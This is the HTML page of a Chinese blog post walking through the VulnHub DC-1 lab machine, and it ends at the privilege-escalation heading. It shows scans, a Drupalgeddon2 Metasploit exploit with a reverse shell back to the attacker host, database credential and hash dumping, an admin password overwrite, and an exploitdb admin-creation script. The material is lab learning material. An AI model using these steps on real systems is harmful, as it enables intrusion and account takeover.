@@ -1,0 +1,569 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>DC：1 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="DC：1">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-06-26 00:00" pubdate>
+        2022年6月26日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      41
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DC：1</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x04-DC-1-vulnhub"><a href="#0x04-DC-1-vulnhub" class="headerlink" title="0x04 DC: 1~vulnhub"></a>0x04 DC: 1~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">DC: 1 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.147</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 03:34 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.00032s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00036s latency).<br>Nmap scan report for 192.168.135.147<br>Host is up (0.0011s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.54 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.147</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>简单的端口扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.147</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 03:35 EDT<br>Nmap scan report for 192.168.135.147<br>Host is up (0.00090s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>56253/tcp open  unknown<br>MAC Address: 00:0C:29:87:9B:9D (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 3.80 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>全面扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.147</span><br><br>80/tcp    open  http    Apache httpd 2.2.22 ((Debian))<br>|_http-generator: Drupal 7 (http://drupal.org)<br>| http-robots.txt: 36 disallowed entries (15 shown)<br>| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br>|_/LICENSE.txt /MAINTAINERS.txt<br>|_http-server-header: Apache/2.2.22 (Debian)<br>|_http-title: Welcome to Drupal Site | Drupal Site<br><br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>其他</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td></td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Drupal 7</td>
+</tr>
+<tr>
+<td>111/tcp</td>
+<td>open</td>
+<td>rpcbind</td>
+<td></td>
+</tr>
+<tr>
+<td>56253/tcp</td>
+<td>open</td>
+<td>unknown</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>80端口</strong></p>
+<p>查看，发现是个  Drupal 的登录页面。可以在 MSF 上根据 Drupal 漏洞脚本进行权限获取。</p>
+<p><strong>111端口</strong></p>
+<p>查看无果。</p>
+<p><strong>56253端口</strong></p>
+<p>查看无果。</p>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>打开msf：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfconsole</span><br>msf6 &gt;<br></code></pre></td></tr></table></figure>
+<p>使用 <code>exploit/unix/webapp/drupal_drupalgeddon2</code> 模块，拿到网站权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options<br><br>Module options (exploit/unix/webapp/drupal_drupalgeddon2):<br><br>   Name         Current Setting  Required  Description<br>   ----         ---------------  --------  -----------<br>   DUMP_OUTPUT  false            no        Dump payload command output<br>   PHP_FUNC     passthru         yes       PHP function to execute<br>   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]<br>   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT        80               yes       The target port (TCP)<br>   SSL          false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /                yes       Path to Drupal install<br>   VHOST                         no        HTTP server virtual host<br><br><br>Payload options (php/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic (PHP In-Memory)<br><br><br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOST 192.168.135.147<br>RHOST =&gt; 192.168.135.147<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)<br>[!] The service is running, but could not be validated.<br>[*] Sending stage (39282 bytes) to 192.168.135.147<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.147:41230) at 2022-06-26 04:42:52 -0400<br><br>meterpreter &gt; shell<br>Process 3432 created.<br>Channel 0 created.<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@DC-1:/var/www$ whoami<br>whoami<br>www-data<br>www-data@DC-1:/var/www$ id<br>id<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/86b3c598a4c4">Vulnhub靶机渗透测试——DC-1 - 简书 (jianshu.com)</a></p>
+</blockquote>
+<h3 id="1、flags"><a href="#1、flags" class="headerlink" title="1、flags"></a>1、flags</h3><p>查看当前目录，发现 flag1.txt ，查看文件得到提示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www$ ls<br>ls<br>COPYRIGHT.txt       LICENSE.txt      cron.php     misc        sites<br>INSTALL.mysql.txt   MAINTAINERS.txt  flag1.txt    modules     themes<br>INSTALL.pgsql.txt   README.txt       includes     profiles    update.php<br>INSTALL.sqlite.txt  UPGRADE.txt      index.php    robots.txt  web.config<br>INSTALL.txt         authorize.php    install.php  scripts     xmlrpc.php<br>www-data@DC-1:/var/www$ cat flag1.txt   <br>cat flag1.txt<br>Every good CMS needs a config file - and so do you.<br></code></pre></td></tr></table></figure>
+<p>百度查到 Drupal 的默认配置文件为 <code>/var/www/sites/default/settings.php</code> 。</p>
+<p><a target="_blank" rel="noopener" href="https://www.iteye.com/blog/justcoding-1407697">drupal7的目录结构及术语 - Just Code - ITeye博客</a></p>
+<p>查看 <code>./sites/default/settings.php</code> ，得到 flag2 和数据库账号密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www$ cd sites<br>cd sites<br>www-data@DC-1:/var/www/sites$ ls<br>ls<br>README.txt  all  default  example.sites.php<br>www-data@DC-1:/var/www/sites$ cd default<br>cd default<br>www-data@DC-1:/var/www/sites/default$ ls<br>ls<br>default.settings.php  files  settings.php<br>www-data@DC-1:/var/www/sites/default$ cat settings.php<br>cat settings.php<br>&lt;?php<br><br>/**<br> *<br> * flag2<br> * Brute force and dictionary attacks aren&#x27;t the<br> * only ways to gain access (and you WILL need access).<br> * What can you do with these credentials?<br> *<br> */<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash">databases = array (</span><br>  &#x27;default&#x27; =&gt; <br>  array (<br>    &#x27;default&#x27; =&gt; <br>    array (<br>      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,<br>      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,<br>      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,<br>      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,<br>      &#x27;port&#x27; =&gt; &#x27;&#x27;,<br>      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,<br>      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,<br>    ),<br>  ),<br>);<br></code></pre></td></tr></table></figure>
+<p>登录数据库，查找有用信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www/sites/default$ mysql -udbuser -pR0ck3t<br>mysql -udbuser -pR0ck3t<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 34839<br>Server version: 5.5.60-0+deb7u1 (Debian)<br><br>Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show databases;</span><br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| drupaldb           |<br>+--------------------+<br>2 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use drupaldb</span><br>use drupaldb<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show tables;</span><br>show tables;<br>+-----------------------------+<br>| Tables_in_drupaldb          |<br>+-----------------------------+<br>| ......                      |<br>| users                       |<br>| ......                      |<br>| variable                    |<br>+-----------------------------+<br>80 rows in set (0.05 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select name,pass from users;</span>        <br>select name,pass from users;<br>+---------------------+---------------------------------------------------------+<br>| name                | pass                                                    |<br>+---------------------+---------------------------------------------------------+<br>| admin               | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |<br>| Fred                | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |<br>| crawlergo@gmail.com | $S$DpPx0Vh5tAyL9HA9HnThsFUIDl2RWa6qNxi4lVWmvcga3xtltPxb |<br>+---------------------+---------------------------------------------------------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
+<p>可以看到 admin 用户的密码被加密了的，但是我们可以想办法修改密码或新增一个 admin 权限的用户：</p>
+<p><strong>方法一：</strong>修改 admin 用户的密码</p>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http%3A%2F%2Fdrupalchina.cn%2Fnode%2F2128">忘记Drupal的管理员密码的解决办法</a></p>
+</blockquote>
+<p>使用 Drupal 对数据库的加密方法，生成一个新密码，然后把新的密码更新到 admin 用户；或者直接注册一个新用户，将其加密后的密码直接替换到 admin 用户。</p>
+<p>加密脚本为： <code>/var/www/scripts/password-hash.sh</code> </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ww-data@DC-1:/var/www$ php scripts/password-hash.sh 123  <br>php scripts/password-hash.sh 123<br><br>password: 123           hash: $S$DKq7UGmp4iVzRUkizvlJH1h2.U6cOytmml9/ow7/SrAqUTsLqY46<br><br></code></pre></td></tr></table></figure>
+<p>替换 admin 的密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">mysql&gt;</span><span class="bash"> select name,pass from users;</span><br>select name,pass from users;<br>+---------------------+---------------------------------------------------------+<br>| name                | pass                                                    |<br>+---------------------+---------------------------------------------------------+<br>| admin               | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |<br>| Fred                | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |<br>| crawlergo@gmail.com | $S$DpPx0Vh5tAyL9HA9HnThsFUIDl2RWa6qNxi4lVWmvcga3xtltPxb |<br>+---------------------+---------------------------------------------------------+<br>4 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> update users <span class="hljs-built_in">set</span> pass=<span class="hljs-string">&quot;$S<span class="hljs-variable">$DKq7UGmp4iVzRUkizvlJH1h2</span>.U6cOytmml9/ow7/SrAqUTsLqY46&quot;</span> <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;admin&quot;</span>;</span><br>&lt;H1h2.U6cOytmml9/ow7/SrAqUTsLqY46&quot; where name=&quot;admin&quot;;                       <br>Query OK, 1 row affected (0.00 sec)<br>Rows matched: 1  Changed: 1  Warnings: 0<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select name,pass from users;</span><br>select name,pass from users;<br>+---------------------+---------------------------------------------------------+<br>| name                | pass                                                    |<br>+---------------------+---------------------------------------------------------+<br>| admin               | $S$DKq7UGmp4iVzRUkizvlJH1h2.U6cOytmml9/ow7/SrAqUTsLqY46 |<br>| Fred                | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |<br>| crawlergo@gmail.com | $S$DpPx0Vh5tAyL9HA9HnThsFUIDl2RWa6qNxi4lVWmvcga3xtltPxb |<br>+---------------------+---------------------------------------------------------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
+<p><strong>方法二：</strong>新增一个 admin 权限的用户</p>
+<p>在 exploitdb 中有一个针对 Drupal 7 版本的攻击脚本，可以增加一个 admin 权限的用户账号</p>
+<p>查看 Drupal 版本,确定 Drupal 版本为7.24</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat /var/www/includes/bootstrap.inc | grep VERSION<br></code></pre></td></tr></table></figure>
+<p>查找利用脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ searchsploit drupal<br></code></pre></td></tr></table></figure>
+<p>攻击脚本适用于 7.31 以下，所以适合 7.24 版本，可以利用漏洞增加 admin 权限用户，增加有 admin 权限的用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.135.147 -u admin1 -p admin1<br></code></pre></td></tr></table></figure>
+<p>成功登录，在 <code>Find content</code> 里找到 <code>flag3</code> ，查看得到提示：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">flag3<br>Special PERMS will <span class="hljs-built_in">help</span> FIND the passwd - but yo<span class="hljs-string">u&#x27;ll need to -exec that command to work out how to get what&#x27;</span>s <span class="hljs-keyword">in</span> the shadow.<br></code></pre></td></tr></table></figure>
+<p>查看 <code>/etc/passwd</code> ，得知有个用户为 flag4，在其目录下找到 flag4.txt ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www$ cat /etc/passwd<br>cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>......<br>mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false<br>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash<br>www-data@DC-1:/var/www$ cd /home/flag4<br>cd /home/flag4<br>www-data@DC-1:/home/flag4$ ls<br>ls<br>flag4.txt<br>www-data@DC-1:/home/flag4$ cat flag4.txt<br>cat flag4.txt<br>Can you use this same method to find or access the flag in root?<br><br>Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?<br></code></pre></td></tr></table></figure>
+<p>根据提示，猜测 <code>/root</code> 目录下应该也有个 flag ，查找发现 <code>/root/thefinalflag.txt</code> ，查看权限不够。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/home/flag4$ find /root<br>find /root<br>/root<br>/root/.profile<br>/root/.drush<br>/root/.drush/drush.complete.sh<br>......<br>/root/thefinalflag.txt<br>/root/.bash_history<br>/root/.bashrc<br>/root/.aptitude<br>/root/.aptitude/config<br>www-data@DC-1:/var/www$ cat /root/thefinalflag.txt<br>cat /root/thefinalflag.txt<br>cat: /root/thefinalflag.txt: Permission denied<br></code></pre></td></tr></table></figure>
+<h3 id="2、SUID提权"><a href="#2、SUID提权" class="headerlink" title="2、SUID提权"></a>2、SUID提权</h3><blockquote>
